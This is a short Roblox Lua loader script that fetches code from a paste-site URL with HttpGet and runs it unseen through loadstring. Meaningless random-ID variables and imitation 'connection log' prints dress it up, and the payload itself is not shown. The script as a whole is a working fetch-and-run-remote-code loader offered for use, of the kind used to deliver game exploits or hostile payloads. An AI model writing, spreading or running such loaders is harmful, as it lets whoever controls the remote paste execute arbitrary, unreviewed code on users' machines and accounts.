-- GitHub Roblox Script Loader - Extended & Randomized

-- Random ID generator
local function makeID()
    return "id_" .. tostring(math.random(100000, 999999))
end

-- Random variables
local remoteURL = "https://pastefy.app/6BYLqMST/raw"
local accessKey = makeID()
local responseData = makeID()
local runHandler = makeID()
local verifyExec = makeID()

-- Simulated connection logs
print("[Loader] Connecting to remote source:", remoteURL)

-- Function to get script
local function fetchRemoteScript(url)
    local success, response = pcall(function()
        return game:HttpGet(url, true)
    end)

    if success then
        print("[Loader] Response received - ID:", accessKey)
        return response
    else
        warn("[Loader Error] Could not fetch script:", url)
        return nil
    end
end

-- Function to execute script
local function safelyExecuteScript(scriptCode)
    local status, exec = pcall(loadstring, scriptCode)
    if status and exec then
        print("[Execute] Running code via", runHandler)
        return pcall(exec)
    else
        warn("[Execute Error] Code execution failed.")
    end
end

-- Run
local scriptContent = fetchRemoteScript(remoteURL)
if scriptContent then
    safelyExecuteScript(scriptContent)
else
    warn("[Abort] Script download failed.")
end

print("[Loader] Execution complete via loader ID:", verifyExec)